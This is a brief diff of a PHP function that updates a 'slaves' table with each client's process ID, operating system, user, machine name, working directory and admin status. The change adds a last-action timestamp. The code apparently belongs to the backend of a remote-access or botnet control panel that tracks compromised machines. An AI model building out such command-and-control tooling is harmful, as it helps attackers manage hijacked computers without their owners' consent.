@@ -2,7 +2,7 @@
 
 function updateSessionDetails($conn, $pid, $opsys, $sus, $mName, $wdir, $isAdmin, $str, $ip)
 {
-    $registerSlave = $conn->prepare("Update slaves set slaveProcessId=?, slaveOperatingSystem=?, slaveUser=?, slaveMachineName=?, slaveWorkingDir=?, slaveIsAdmin=?, regCompleted='true' where slaveId=?");
+    $registerSlave = $conn->prepare("Update slaves set slaveProcessId=?, slaveOperatingSystem=?, slaveUser=?, slaveMachineName=?, slaveWorkingDir=?, slaveIsAdmin=?, regCompleted='true', slaveLatestAction=NOW() where slaveId=?");
       if($registerSlave !== false)
         {
          $errorControl = $registerSlave->bind_param("issssss", $pid, $opsys, $sus, $mName, $wdir, $isAdmin, $str);
